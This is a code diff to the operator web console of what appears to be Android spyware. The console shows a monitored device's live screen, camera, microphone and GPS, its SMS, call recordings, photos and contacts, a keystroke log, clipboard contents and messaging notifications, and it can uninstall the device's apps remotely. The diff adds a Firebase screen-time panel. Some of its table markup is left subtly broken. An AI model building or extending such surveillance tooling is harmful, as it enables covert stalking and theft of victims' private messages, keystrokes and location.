@@ -217,6 +217,13 @@
         .map-type-toggle:hover {
             background: #f0f4f8;
         }
+        /* Date selector for screen time */
+        .date-selector {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
         @media (max-width: 768px) {
             #sidebar { position: fixed; top: 0; left: 0; bottom: 0; transform: translateX(-100%); z-index: 1000; box-shadow: var(--shadow-lg); width: 280px; }
             #sidebar.open { transform: translateX(0); }
@@ -321,10 +328,11 @@ const panel = document.getElementById('main-panel');
 const statusEl = document.getElementById('status');
 const wsDebug = document.getElementById('wsDebug');
 
-// Helper functions (existing)
+// Helper functions
 function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
 function formatBytes(b) { if(b===0) return '0 B'; const i=Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,i)).toFixed(1)+' '+['B','KB','MB','GB'][i]; }
 function formatDuration(ms) { const h=Math.floor(ms/3600000); const m=Math.floor((ms%3600000)/60000); const s=Math.floor((ms%60000)/1000); return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`; }
+function formatDurationSeconds(seconds) { if(!seconds) return ''; const mins = Math.floor(seconds / 60); const secs = seconds % 60; return `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`; }
 function getColorForDuration(ms) { if(ms>3600000) return '#d32f2f'; if(ms>1800000) return '#ff9800'; return '#4caf50'; }
 function setStatus(s) { statusEl.innerText=s; if(s==='ONLINE'){statusEl.classList.remove('offline');statusEl.style.background='#e8f5e9';statusEl.style.color='#2e7d32';}else{statusEl.classList.add('offline');statusEl.style.background='#ffebee';statusEl.style.color='#c62828';} }
 function showNotification(t) { const o=statusEl.innerText; statusEl.innerText=t; setTimeout(()=>statusEl.innerText=o,2000); }
@@ -442,7 +450,7 @@ function sendCommand(cmd,params={}){
 }
 function sendPlainText(t){ if(ws&&ws.readyState===WebSocket.OPEN) ws.send(t); }
 
-// ==================== WEBRTC (enhanced for screen share) ====================
+// ==================== WEBRTC (screen share with working buttons) ====================
 function createPeerConnection(type, onTrack, useMic, iceServers = CONFIG.ICE_SERVERS){
     const pc = new RTCPeerConnection({ iceServers: iceServers });
     if(type==='screen') pc.addTransceiver('video',{direction:'recvonly'});
@@ -458,15 +466,12 @@ function handleSignaling(msg){
     if(msg.type==='ANSWER'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc) pc.setRemoteDescription(new RTCSessionDescription({type:'answer',sdp:msg.sdp})); }
     else if(msg.type==='ICE_CANDIDATE'){ const pc=msg.streamType==='screen'?screenPC:msg.streamType==='camera'?cameraPC:audioPC; if(pc&&msg.candidate) pc.addIceCandidate(new RTCIceCandidate(msg.candidate)); }
 }
-
-// ==================== SCREEN SHARE (fixed modal buttons) ====================
 async function toggleScreen(){
     if(screenActive){
         if(screenPC)screenPC.close(); screenPC=null; screenActive=false;
         document.getElementById('screenBtn').innerText='Start Screen';
         document.getElementById('screenModalOverlay').classList.remove('show');
         sendSignaling({type:'STOP_SCREEN'});
-        // Stop any ongoing recording
         if(screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
         screenMediaRecorder = null;
         screenRecordedChunks = [];
@@ -490,8 +495,6 @@ async function toggleScreen(){
             sendSignaling({type:'OFFER', sdp:offer.sdp, streamType:'screen'});
             document.getElementById('screenBtn').innerText='Stop Screen';
             screenActive = true;
-            // Reset recording state
-            if(screenMediaRecorder && screenMediaRecorder.state === 'recording') screenMediaRecorder.stop();
             screenMediaRecorder = null;
             screenRecordedChunks = [];
             document.getElementById('modalRecordBtn').innerText = '🔴';
@@ -504,8 +507,6 @@ async function toggleScreen(){
         }
     }
 }
-
-// Snap screenshot from modal video
 function snapScreenFromModal() {
     const video = document.getElementById('modalScreenVideo');
     if(!video || !video.videoWidth) {
@@ -526,8 +527,6 @@ function snapScreenFromModal() {
         showNotification('Screenshot saved');
     }, 'image/png');
 }
-
-// Toggle screen recording (using canvas capture for reliability)
 function toggleScreenRecording() {
     const video = document.getElementById('modalScreenVideo');
     if(!video || !video.srcObject) {
@@ -539,7 +538,6 @@ function toggleScreenRecording() {
         document.getElementById('modalRecordBtn').innerText = '🔴';
         showNotification('Recording stopped');
     } else {
-        // Wait for video to have dimensions
         if(video.videoWidth === 0) {
             video.addEventListener('loadedmetadata', () => startScreenRecording(), { once: true });
         } else {
@@ -554,7 +552,6 @@ function startScreenRecording() {
         return;
     }
     screenRecordedChunks = [];
-    // Create a canvas that mirrors the video
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -567,7 +564,6 @@ function startScreenRecording() {
     };
     drawFrame();
     const canvasStream = canvas.captureStream(30);
-    // Add audio tracks if any from the original stream
     const originalStream = video.srcObject;
     if(originalStream && originalStream.getAudioTracks().length) {
         originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
@@ -587,11 +583,10 @@ function startScreenRecording() {
         screenRecordedChunks = [];
         showNotification('Recording saved');
     };
-    screenMediaRecorder.start(1000); // collect chunks every second
+    screenMediaRecorder.start(1000);
     document.getElementById('modalRecordBtn').innerText = '🟢';
     showNotification('Recording started');
 }
-
 function toggleFullscreen() {
     const video = document.getElementById('modalScreenVideo');
     if(!video) return;
@@ -601,7 +596,6 @@ function toggleFullscreen() {
         document.exitFullscreen();
     }
 }
-
 function closeScreenModal() {
     if(screenMediaRecorder && screenMediaRecorder.state === 'recording') {
         screenMediaRecorder.stop();
@@ -609,26 +603,22 @@ function closeScreenModal() {
     document.getElementById('screenModalOverlay').classList.remove('show');
     document.body.classList.remove('modal-open');
     if(screenActive) {
-        // Stop the screen share
         if(screenPC) screenPC.close();
         screenPC = null;
         screenActive = false;
         document.getElementById('screenBtn').innerText = 'Start Screen';
         sendSignaling({type:'STOP_SCREEN'});
     }
-    // Clear video source
     const modalVideo = document.getElementById('modalScreenVideo');
     if(modalVideo) modalVideo.srcObject = null;
     document.getElementById('modalRecordBtn').innerText = '🔴';
 }
-
-// Attach modal button listeners (ensuring they exist)
 document.getElementById('modalSnapBtn').addEventListener('click', snapScreenFromModal);
 document.getElementById('modalRecordBtn').addEventListener('click', toggleScreenRecording);
 document.getElementById('modalFullscreenBtn').addEventListener('click', toggleFullscreen);
 document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);
 
-// ==================== CAMERA MODAL (unchanged but functional) ====================
+// ==================== CAMERA MODAL ====================
 function showCameraModal(stream, cameraType){
     const modal=document.getElementById('cameraModalOverlay');
     const video=document.getElementById('modalCameraVideo');
@@ -713,7 +703,7 @@ async function startLiveAudio(){
 }
 function stopLiveAudio(){ if(audioPC)audioPC.close(); audioPC=null; sendSignaling({type:'STOP_AUDIO'}); document.getElementById('liveAudioBtn').style.display='block'; document.getElementById('stopLiveAudioBtn').style.display='none'; panel.innerHTML='Ready.'; }
 
-// ==================== FILE MANAGER (sorted & fixed toolbar) ====================
+// ==================== FILE MANAGER ====================
 function renderFileTreeNodes(data, path) {
     const folders = data.filter(i=>i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
     const files = data.filter(i=>!i.isDir).sort((a,b)=>a.name.localeCompare(b.name));
@@ -828,7 +818,7 @@ function deleteSelected() { if (selectedFiles.length === 0) { alert('No files se
 function updateSelected(checkbox) { const path = checkbox.dataset.path; if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); } else { selectedFiles = selectedFiles.filter(p => p !== path); } updateCounters(); }
 function updateCounters() { const count = selectedFiles.length; const downloadSpan = document.getElementById('downloadCount'); const deleteSpan = document.getElementById('deleteCount'); if (downloadSpan) downloadSpan.innerText = count; if (deleteSpan) deleteSpan.innerText = count; }
 
-// ==================== CALL RECORDINGS (Firebase + Fallback) ====================
+// ==================== CALL RECORDINGS ====================
 async function showCallRecordingsPanel() {
     if (!selectedDeviceId) {
         panel.innerHTML = '<p>No device selected.</p>';
@@ -838,17 +828,14 @@ async function showCallRecordingsPanel() {
         panel.innerHTML = '<p>You must be logged in.</p>';
         return;
     }
-
     panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading recordings from Firebase...</p>';
-
     try {
         let snapshot = null;
         try {
             snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings')
                 .orderBy('timestamp', 'desc')
                 .get();
-        } catch(e) { /* fallback to top‑level */ }
-
+        } catch(e) {}
         if (!snapshot || snapshot.empty) {
             snapshot = await db.collection('call_recordings')
                 .where('deviceId', '==', selectedDeviceId)
@@ -856,7 +843,6 @@ async function showCallRecordingsPanel() {
                 .orderBy('timestamp', 'desc')
                 .get();
         }
-
         if (snapshot.empty) {
             panel.innerHTML = `
                 <h3>🎙️ Call Recordings</h3>
@@ -869,7 +855,6 @@ async function showCallRecordingsPanel() {
             });
             return;
         }
-
         let html = '<h3>🎙️ Call Recordings (Firebase)</h3><div style="margin-top:16px;">';
         snapshot.forEach(doc => {
             const rec = doc.data();
@@ -892,7 +877,6 @@ async function showCallRecordingsPanel() {
         });
         html += '</div>';
         panel.innerHTML = html;
-
         document.querySelectorAll('.download-recording-btn').forEach(btn => {
             btn.addEventListener('click', async (e) => {
                 const url = btn.getAttribute('data-url');
@@ -939,7 +923,7 @@ async function showCallRecordingsPanel() {
     }
 }
 
-// ==================== PHOTO GALLERY (Firebase) ====================
+// ==================== PHOTO GALLERY ====================
 async function showPhotoGalleryPanel() {
     if (!selectedDeviceId) {
         panel.innerHTML = '<p>No device selected.</p>';
@@ -1041,12 +1025,103 @@ function showFullPhoto(imageUrl, photoId, storagePath) {
     modal.addEventListener('click', (e) => { if(e.target === modal) modal.remove(); });
 }
 
-// ==================== ENHANCED MAP WITH REVERSE GEOCODING & MAP TYPE TOGGLE ====================
+// ==================== SCREEN TIME (from Firebase) ====================
+async function showAppUsagePanel() {
+    if (!selectedDeviceId) {
+        panel.innerHTML = '<p>No device selected.</p>';
+        return;
+    }
+    if (!currentUser) {
+        panel.innerHTML = '<p>You must be logged in.</p>';
+        return;
+    }
+    // Show date selector
+    panel.innerHTML = `
+        <h3>📊 Screen Time (from Firebase)</h3>
+        <div class="date-selector">
+            <button class="btn-ui primary" data-days="1">Today</button>
+            <button class="btn-ui primary" data-days="7">Last 7 Days</button>
+            <button class="btn-ui primary" data-days="30">Last 30 Days</button>
+        </div>
+        <div id="screenTimeData"></div>
+    `;
+    panel.querySelectorAll('button[data-days]').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const days = parseInt(btn.dataset.days);
+            loadAppUsageFromFirebase(days);
+        });
+    });
+    // Load default (today)
+    loadAppUsageFromFirebase(1);
+}
+async function loadAppUsageFromFirebase(days) {
+    const container = document.getElementById('screenTimeData');
+    if (!container) return;
+    container.innerHTML = '<p>Loading...</p>';
+    try {
+        // Calculate date range
+        const now = new Date();
+        const cutoff = new Date(now.getTime() - days * 86400000);
+        // Query app_usage subcollection for the device
+        const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('app_usage')
+            .where('timestamp', '>=', cutoff)
+            .orderBy('timestamp', 'desc')
+            .get();
+        if (snapshot.empty) {
+            container.innerHTML = '<p>No screen time data found in Firebase. The device app will upload usage stats every hour.</p>';
+            return;
+        }
+        // Aggregate usage by app across all retrieved days
+        const appTotals = new Map(); // appName -> total ms
+        snapshot.forEach(doc => {
+            const data = doc.data();
+            const apps = JSON.parse(data.apps);
+            if (Array.isArray(apps)) {
+                apps.forEach(app => {
+                    const name = app.appName || app.packageName || 'Unknown';
+                    const timeMs = app.totalTimeMs || 0;
+                    if (appTotals.has(name)) {
+                        appTotals.set(name, appTotals.get(name) + timeMs);
+                    } else {
+                        appTotals.set(name, timeMs);
+                    }
+                });
+            }
+        });
+        if (appTotals.size === 0) {
+            container.innerHTML = '<p>No usage data for the selected period.</p>';
+            return;
+        }
+        // Sort by total time descending
+        const sorted = Array.from(appTotals.entries()).sort((a,b) => b[1] - a[1]);
+        const max = sorted[0][1];
+        let html = `<p>Showing aggregated usage for the last ${days} day(s).</p><div style="margin-top:16px;">`;
+        for (let [name, timeMs] of sorted) {
+            const pct = max ? Math.round((timeMs / max) * 100) : 0;
+            const color = getColorForDuration(timeMs);
+            html += `
+                <div class="app-usage-item">
+                    <div class="app-usage-name">${escapeHtml(name)}</div>
+                    <div class="usage-bar-container">
+                        <div class="usage-bar" style="width:${pct}%; background-color:${color};"></div>
+                    </div>
+                    <div class="app-usage-time">${formatDuration(timeMs)}</div>
+                </div>
+            `;
+        }
+        html += '</div>';
+        container.innerHTML = html;
+    } catch (err) {
+        console.error(err);
+        container.innerHTML = '<p style="color:red;">Error loading screen time data: ' + err.message + '</p>';
+    }
+}
+
+// ==================== ENHANCED MAP ====================
 function renderMap(loc){
     let l=typeof loc==='string'?JSON.parse(loc):loc;
     const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
     currentLocation={lat,lon,acc};
-    
     panel.innerHTML = `
         <div style="position:relative;">
             <div id="map" style="height:400px; border-radius:12px;"></div>
@@ -1059,22 +1134,17 @@ function renderMap(loc){
             <div class="map-type-toggle" id="mapTypeToggle">🗺️ Switch to Satellite</div>
         </div>
     `;
-    
     if(mapInstance) mapInstance.remove();
-    
     const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '&copy; OpenStreetMap contributors'
     });
     const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
         attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
     });
-    
     mapInstance = L.map('map').setView([lat, lon], 18);
     streetLayer.addTo(mapInstance);
-    
     L.circle([lat, lon], {radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2}).addTo(mapInstance);
     L.marker([lat, lon], {icon: L.divIcon({className:'current-location-marker', iconSize:[12,12]})}).addTo(mapInstance).bindPopup('Device Location');
-    
     fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
         headers: { 'User-Agent': 'SystemSync-Console/1.0' }
     })
@@ -1087,7 +1157,6 @@ function renderMap(loc){
         console.error('Geocoding error:', err);
         document.getElementById('addressDisplay').innerHTML = '🌍 Address unavailable';
     });
-    
     const toggleBtn = document.getElementById('mapTypeToggle');
     toggleBtn.addEventListener('click', () => {
         if(currentMapType === 'street') {
@@ -1104,14 +1173,13 @@ function renderMap(loc){
     });
 }
 
-// ==================== DATA DISPLAY FUNCTIONS (TABULAR WITH PAGINATION) ====================
+// ==================== DATA DISPLAY FUNCTIONS (with MM:SS for call duration) ====================
 function renderTable(rows, headers) {
     const pageSize = 20;
     const totalPages = Math.ceil(rows.length / pageSize);
     const start = currentPage * pageSize;
     const pageRows = rows.slice(start, start + pageSize);
-    
-    let html = '<div style="overflow-x:auto;"><table><thead></tr>';
+    let html = '<div style="overflow-x:auto;"></table><thead><tr>';
     headers.forEach(h => html += `<th>${h}</th>`);
     html += '</thead><tbody>';
     pageRows.forEach(r => {
@@ -1120,7 +1188,6 @@ function renderTable(rows, headers) {
         html += '</tr>';
     });
     html += '</tbody></table></div>';
-    
     if (totalPages > 1) {
         html += '<div class="pagination">';
         for (let i = 0; i < totalPages; i++) {
@@ -1130,7 +1197,6 @@ function renderTable(rows, headers) {
     }
     panel.innerHTML = html;
 }
-
 window.gotoPage = function(p) {
     currentPage = p;
     if (dataType === 'sms') renderTable(currentData, ['Type', 'Number', 'Message', 'Date']);
@@ -1138,7 +1204,6 @@ window.gotoPage = function(p) {
     else if (dataType === 'contacts') renderTable(currentData, ['Name', 'Number', 'Times Contacted']);
     else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']);
 };
-
 function displaySMS(data) {
     if (!Array.isArray(data) || data.length === 0) {
         panel.innerHTML = '<h3>💬 SMS Messages</h3><p>No messages found.</p>';
@@ -1154,7 +1219,6 @@ function displaySMS(data) {
     dataType = 'sms';
     renderTable(rows, ['Type', 'Number', 'Message', 'Date']);
 }
-
 function displayCallLogs(data) {
     if (!Array.isArray(data) || data.length === 0) {
         panel.innerHTML = '<h3>📞 Call Logs</h3><p>No call logs found.</p>';
@@ -1165,13 +1229,12 @@ function displayCallLogs(data) {
         c.number || '',
         c.name || '',
         c.date || c.timeFmt || '',
-        c.duration ? c.duration + 's' : ''
+        formatDurationSeconds(c.duration)
     ]);
     currentData = rows;
     dataType = 'call';
     renderTable(rows, ['Type', 'Number', 'Name', 'Date', 'Duration']);
 }
-
 function displayContacts(data) {
     if (!Array.isArray(data) || data.length === 0) {
         panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>';
@@ -1186,7 +1249,6 @@ function displayContacts(data) {
     dataType = 'contacts';
     renderTable(rows, ['Name', 'Number', 'Times Contacted']);
 }
-
 function displayWifiNetworks(data) {
     if (!Array.isArray(data) || data.length === 0) {
         panel.innerHTML = '<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>';
@@ -1201,43 +1263,31 @@ function displayWifiNetworks(data) {
     dataType = 'wifi';
     renderTable(rows, ['SSID', 'Signal', 'Status']);
 }
-
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
-    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></tr></div>`;
+    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
-
 function displayBrowserHistory(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></tr></div>`;
 }
-
-function displayAppUsage(data){
-    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📊 Screen Time</h3><p>No data. Enable Usage Access in device Settings.</p>'; return; }
-    const max=Math.max(...data.map(a=>a.totalTimeMs||0));
-    panel.innerHTML=`<h3>📊 Screen Time (${data.length} apps)</h3><div style="margin-top:16px;">${data.map(app=>{ const t=app.totalTimeMs||0; const pct=max?Math.round(t/max*100):0; const color=getColorForDuration(t); return `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(app.appName||app.packageName||'Unknown')}</div><div class="usage-bar-container"><div class="usage-bar" style="width:${pct}%; background-color:${color};"></div></div><div class="app-usage-time">${formatDuration(t)}</div></div>`; }).join('')}</div>`;
-}
-
 function displayKeylog(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><tr><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
     document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG'));
 }
-
 function displayClipboard(data){
     const content=data&&data.content?data.content:(data||'');
     panel.innerHTML=`<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data&&data.type?data.type:'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div><p style="margin-top:12px;">Captures copied text from device.</p>`;
 }
-
 function displaySocialMessages(data){
     let msgs=typeof data==='string'?JSON.parse(data):data;
-    if(!Array.isArray(msgs)||!msgs.length){ panel.innerHTML='<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
+    if(!Array.isArray(msgs)||!msgs.length){ panel.innerHTML='<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p><p><small>Note: Live chat content cannot be captured without root. Only notifications are recorded.</small></p>'; return; }
     panel.innerHTML=`<h3>💬 Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">`+msgs.slice().reverse().map(m=>`<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app||getAppNameFromPkg(m.pkg)||'Unknown')}</strong> <small>${m.timeFmt||''}</small></div><div>${escapeHtml(m.title||'')}</div><div>${escapeHtml(m.text||m.body||'')}</div></div>`).join('')+`</div>`;
 }
 function getAppNameFromPkg(pkg){ const map={'com.whatsapp':'WhatsApp','org.telegram.messenger':'Telegram','com.instagram.android':'Instagram','com.facebook.orca':'Messenger','com.facebook.katana':'Facebook','com.snapchat.android':'Snapchat'}; return map[pkg]||pkg; }
-
 function showGeofencePanel(){
     if(!currentLocation){
         sendCommand('GET_LOCATION');
@@ -1309,11 +1359,6 @@ function showSmsKeywordsPanel(){
 }
 function displaySmsKeywords(data){ /* simplified */ }
 function displaySmsAlerts(data){ /* simplified */ }
-function showAppUsagePanel(){
-    panel.innerHTML='<h3>📊 Screen Time</h3><div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap"><button data-days="1" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">Today</button><button data-days="7" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">7 Days</button><button data-days="30" style="padding:8px 16px;background:#1976ff;color:#fff;border:none;border-radius:8px;cursor:pointer">30 Days</button></div><p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission in device Settings</p>';
-    panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_APP_USAGE',{days:parseInt(btn.dataset.days)}));
-    sendCommand('GET_APP_USAGE',{days:1});
-}
 function capturePicture(){ const camera=document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT',{camera,flash:document.getElementById('clickFlashCheckbox').checked}); }
 function displayCapturedImage(b64){ panel.innerHTML=`<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div style="margin-top:12px;"><button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;">💾 SAVE IMAGE</button></div>`; }
 function toggleLiveGps(){ liveGpsActive=!liveGpsActive; sendCommand(liveGpsActive?'START_GPS_UPDATES':'STOP_GPS_UPDATES'); const btn=document.getElementById('liveGpsBtn'); if(btn){ btn.style.background=liveGpsActive?'#d32f2f':''; btn.querySelector('span:last-child').textContent=liveGpsActive?'Stop GPS Track':'Live GPS Track'; } }
